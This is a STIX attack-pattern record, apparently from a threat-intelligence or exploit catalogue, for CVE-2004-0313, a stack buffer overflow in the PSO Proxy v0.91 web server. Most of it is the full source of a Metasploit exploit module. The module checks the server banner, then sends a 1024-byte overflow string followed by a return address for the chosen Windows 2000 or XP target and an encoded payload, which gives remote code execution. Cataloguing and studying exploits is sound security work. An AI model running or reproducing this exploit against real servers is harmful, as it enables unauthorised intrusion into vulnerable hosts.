{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1fdf831c-57ea-4ca5-9fcf-ff5ae0e51cf1",
    "created": "2024-08-14T16:54:09.453373Z",
    "modified": "2024-08-14T16:54:09.453377Z",
    "name": "PSO Proxy v0.91 Stack Buffer Overflow",
    "description": " This module exploits a buffer overflow in the PSO Proxy v0.91 web server. If a client sends an excessively long string the stack is overwritten. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/psoproxy91_overflow.rb",
            "external_id": "psoproxy91_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-0313"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'PSO Proxy v0.91 Stack Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a buffer overflow in the PSO Proxy v0.91 web server.\n        If a client sends an excessively long string the stack is overwritten.\n      },\n      'Author'         => [ 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-0313' ],\n          [ 'OSVDB', '4028' ],\n          [ 'EDB', '156' ],\n          [ 'BID', '9706' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 370,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n        # Patrick - Tested OK 2007/09/06 against w2ksp0, w2ksp4, xpsp0,xpsp2 en.\n          [ 'Windows 2000 Pro SP0-4 English',  { 'Ret' => 0x75023112 } ], # call ecx ws2help.dll\n          [ 'Windows 2000 Pro SP0-4 French',   { 'Ret' => 0x74fa3112 } ], # call ecx ws2help.dll\n          [ 'Windows 2000 Pro SP0-4 Italian',  { 'Ret' => 0x74fd3112 } ], # call ecx ws2help.dll\n          [ 'Windows XP Pro SP0/1 English',    { 'Ret' => 0x71aa396d } ], # call ecx ws2help.dll\n          [ 'Windows XP Pro SP2 English',\t     { 'Ret' => 0x71aa3de3 } ], # call ecx ws2help.dll\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2004-02-20'\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n      ])\n  end\n\n  def check\n    connect\n    sock.put(\"GET / HTTP/1.0\\r\\n\\r\\n\")\n    banner = sock.get_once\n    if (banner.to_s =~ /PSO Proxy 0\\.9/)\n      return Exploit::CheckCode::Appears\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    exploit = rand_text_alphanumeric(1024, payload_badchars)\n    exploit += [target['Ret']].pack('V') + payload.encoded\n\n    sock.put(exploit + \"\\r\\n\\r\\n\")\n\n    disconnect\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-02-20",
    "x_mitre_platforms": [
        "win'"
    ]
}